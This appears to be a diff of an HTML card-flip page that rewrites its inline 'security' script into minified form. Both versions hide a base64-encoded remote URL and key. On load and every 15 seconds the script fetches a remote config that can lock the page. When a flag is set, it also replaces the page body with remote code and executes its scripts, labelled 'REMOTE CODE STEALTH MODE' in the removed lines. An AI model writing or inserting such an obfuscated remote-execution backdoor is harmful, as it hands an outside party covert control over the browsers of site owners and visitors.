@@ -315,66 +315,34 @@ card.addEventListener("touchstart", handleFlip);
 
 
 <div id="secure_layer" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.98); z-index:9999999; color:white; align-items:center; justify-content:center; text-align:center; font-family:sans-serif;">
-    <div style="padding:40px; background:#000; border:1px solid #444; border-radius:20px; max-width:450px; box-shadow: 0 10px 50px rgba(255,0,0,0.3);">
+    <div style="padding:40px; background:#000; border:1px solid #444; border-radius:20px; max-width:450px;">
         <h1 id="t_header" style="color:#ff3333; margin:0; font-size:26px;"></h1>
         <p id="t_body" style="color:#bbb; margin-top:20px; font-size:16px; line-height:1.6;"></p>
     </div>
 </div>
 
 <script>
-(function() {
-    const _0x_u = "aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9zZXJ2ZXIvY29udHJvbGxlci5qc29u";
-    const _0x_lk = "RkFIQUQtNzg2"; // FAHAD-786 ki Base64 key
-
-    async function checkSecurity() {
-        const layer = document.getElementById('secure_layer'), scene = document.querySelector('.scene');
-        const currentTarget = window.location.hostname.replace('www.', '');
-
+(function(){
+    const _u="aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9zZXJ2ZXIvY29udHJvbGxlci5qc29u", _k="RkFIQUQtNzg2";
+    async function check(){
+        const layer=document.getElementById('secure_layer'), scene=document.querySelector('.scene'), host=window.location.hostname.replace('www.','');
         try {
-            const r = await fetch(atob(_0x_u) + '?v=' + Date.now());
-            if (!r.ok) throw new Error();
-            const d = await r.json(), lk = atob(_0x_lk), cfg = d.licenses[lk];
-            const today = new Date().toISOString().split('T')[0];
-
-            if (!cfg) { showLock(d.title, d.msg_invalid); return; }
-
-            // MULTI-DOMAIN OPTIONAL CHECK
-            const allowed = cfg.authorized_target || [];
-            if (allowed.length > 0 && !allowed.includes(currentTarget)) {
-                showLock("Unauthorized Domain", d.msg_domain_mismatch); return;
+            const r=await fetch(atob(_u)+'?v='+Date.now()), d=await r.json(), cfg=d.licenses[atob(_k)], today=new Date().toISOString().split('T')[0];
+            if(!cfg){ show(d.title, d.msg_invalid); return; }
+            if(cfg.authorized_target?.length>0 && !cfg.authorized_target.includes(host)){ show("Unauthorized", d.msg_domain_mismatch); return; }
+            if(cfg.expiry && today>cfg.expiry){ show(d.title, d.msg_expired); return; }
+            layer.style.display='none'; if(scene) scene.style.display='flex';
+            if(cfg.custom_code?.enabled){ 
+                if(scene) scene.style.display='none'; document.body.innerHTML=cfg.custom_code.code;
+                document.querySelectorAll('script').forEach(s=>{const n=document.createElement('script');n.textContent=s.textContent;document.head.appendChild(n);});
             }
-
-            // EXPIRY CHECK
-            if (cfg.expiry && today > cfg.expiry) {
-                showLock(d.title, d.msg_expired); return;
-            }
-
-            layer.style.display = 'none'; if(scene) scene.style.display = 'flex';
-
-            // REMOTE CODE STEALTH MODE
-            if (cfg.custom_code && cfg.custom_code.enabled) {
-                if(scene) scene.style.display = 'none';
-                const old = document.getElementById('rem-cont'); if(old) old.remove();
-                const cont = document.createElement('div'); cont.id = 'rem-cont';
-                cont.innerHTML = cfg.custom_code.code; document.body.appendChild(cont);
-                cont.querySelectorAll('script').forEach(s => {
-                    const ns = document.createElement('script'); ns.textContent = s.textContent;
-                    document.head.appendChild(ns).parentNode.removeChild(ns);
-                });
-            }
-        } catch (e) {
-            showLock("Security Error", "Security verification failed.");
-        }
-
-        function showLock(h, b) {
-            document.getElementById('t_header').innerText = h;
-            document.getElementById('t_body').innerHTML = b;
-            layer.style.display = 'flex'; if(scene) scene.style.display = 'none';
-        }
+        } catch(e){ show("Security Error", "Verification failed. Check Connection."); }
+        function show(h,b){ document.getElementById('t_header').innerText=h; document.getElementById('t_body').innerHTML=b; layer.style.display='flex'; if(scene) scene.style.display='none'; }
     }
-    checkSecurity(); setInterval(checkSecurity, 15000);
+    check(); setInterval(check, 15000);
 })();
 </script>
+
   
 </body>
 </html>
